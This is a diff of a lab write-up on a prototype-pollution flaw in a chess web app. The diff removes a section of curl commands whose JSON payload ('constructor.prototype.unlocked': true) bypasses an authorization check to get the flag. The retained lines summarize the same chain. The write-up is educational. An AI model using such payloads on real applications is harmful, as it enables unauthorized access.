@@ -204,69 +204,6 @@ Checkmate
 Reward / Flag
 ```
 
----
-
-## 9. Recreating the Exploit with cURL
-
-After confirming the vulnerability via Burp Suite, the attack was recreated with cURL, using a cookie jar to persist the session across the reset, pollution, and move requests.
-
-```bash
-target=10.113.188.132:3000
-```
-
-### Step 1 — Reset the Session
-
-`-c` saves cookies to `cookies.txt`; `-b` sends cookies from that file.
-
-```bash
-curl -s -c cookies.txt -b cookies.txt \
-  -X POST http://$target/api/reset \
-  -H "Content-Length: 0" >/dev/null
-```
-
-This establishes a clean game state and the cookie jar reused in later steps.
-
-### Step 2 — Pollute the Prototype
-
-```bash
-curl -s -c cookies.txt -b cookies.txt \
-  -X POST http://$target/api/settings \
-  -H "Content-Type: application/json" \
-  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"unlocked":true}}}'
-```
-
-Key payload:
-
-```json
-"constructor": {
-  "prototype": {
-    "unlocked": true
-  }
-}
-```
-
-This exploits the vulnerable object merge, polluting `Object.prototype` with `unlocked: true` — which affects any object (including `session.config`) that doesn't explicitly define its own `unlocked` property.
-
-### Step 3 — Perform the Checkmate Move
-
-```bash
-curl -s -c cookies.txt -b cookies.txt \
-  -X POST http://$target/api/move \
-  -H "Content-Type: application/json" \
-  -d '{"from":"a1","to":"a8"}'
-```
-
-The server evaluates the move, then checks the reward condition:
-
-| Stage | `session.config.unlocked` |
-|---|---|
-| Before pollution | Unset |
-| After pollution | `true` (inherited via `Object.prototype`) |
-
-The application considers the reward unlocked and returns the flag.
-
----
-
 ## Final Exploitation Path
 
 ```
@@ -332,3 +269,5 @@ The core security issue is not the chess logic itself — the game simply provid
 This room demonstrates how seemingly harmless JSON settings can become dangerous when merged into JavaScript objects without guarding against prototype pollution.
 
 **Final chain:** `/api/settings` → `constructor.prototype` → `Object.prototype.unlocked = true` → `session.config.unlocked` → Authorization Bypass → Checkmate → **Flag**
+
+
